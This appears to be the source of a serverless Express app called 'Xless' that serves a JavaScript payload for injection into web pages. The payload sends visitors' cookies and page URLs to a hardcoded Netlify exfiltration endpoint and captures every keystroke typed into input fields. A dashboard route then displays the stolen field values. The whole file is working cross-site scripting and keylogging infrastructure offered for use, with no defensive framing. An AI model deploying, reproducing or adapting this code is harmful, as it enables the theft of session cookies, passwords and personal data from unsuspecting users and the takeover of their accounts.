const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const serverless = require('serverless-http');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let capturedData = [];

app.post('/api/exfiltrate', (req, res) => {
    const data = req.body;
    data.time = new Date().toLocaleString();
    capturedData.unshift(data);
    res.json({ status: 'success' });
});

app.get('/api/data', (req, res) => {
    res.json(capturedData);
});

app.get('/', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    // كود السحب الصافي بدون علامات معقدة
    var payload = "console.log('Xless Active');" +
        "var target = 'https://willowy-kataifi-31efc6.netlify.app/api/exfiltrate';" +
        "function send(d){ fetch(target, {method:'POST', mode:'no-cors', body:JSON.stringify(d)}); }" +
        "send({ url: location.href, cookies: document.cookie, type: 'initial_hit' });" +
        "document.addEventListener('input', function(e){" +
        "var i = e.target; var n = (i.name || i.id || '').toLowerCase();" +
        "send({ field: n, value: i.value, url: location.href, type: 'live_capture' });" +
        "});";
    res.send(payload);
});

app.get('/dashboard', (req, res) => {
    // لوحة التحكم باستخدام نصوص بسيطة لتجنب أخطاء Netlify
    var html = "<html><head><title>Xless Panel</title><style>" +
        "body{background:#000;color:#0f0;font-family:monospace;padding:20px}" +
        "table{width:100%;border-collapse:collapse;margin-top:20px}" +
        "th,td{border:1px solid #333;padding:10px;text-align:left}" +
        "th{background:#111}.val{color:#f0f;font-weight:bold}" +
        "</style></head><body>" +
        "<h1>XLESS LIVE PANEL</h1>" +
        "<button onclick='location.reload()'>REFRESH</button>" +
        "<table><thead><tr><th>Time</th><th>Field</th><th>Value</th></tr></thead>" +
        "<tbody id='b'></tbody></table>" +
        "<script>" +
        "fetch('/api/data').then(r=>r.json()).then(data=>{" +
        "var h=''; data.forEach(d=>{" +
        "h+='<tr><td>'+d.time+'</td><td>'+(d.field||d.type)+'</td><td class=\"val\">'+(d.value||'HIT')+'</td></tr>';" +
        "}); document.getElementById('b').innerHTML=h||'<tr><td colspan=\"3\">No Data</td></tr>';" +
        "});" +
        "</script></body></html>";
    res.send(html);
});

module.exports.handler = serverless(app);
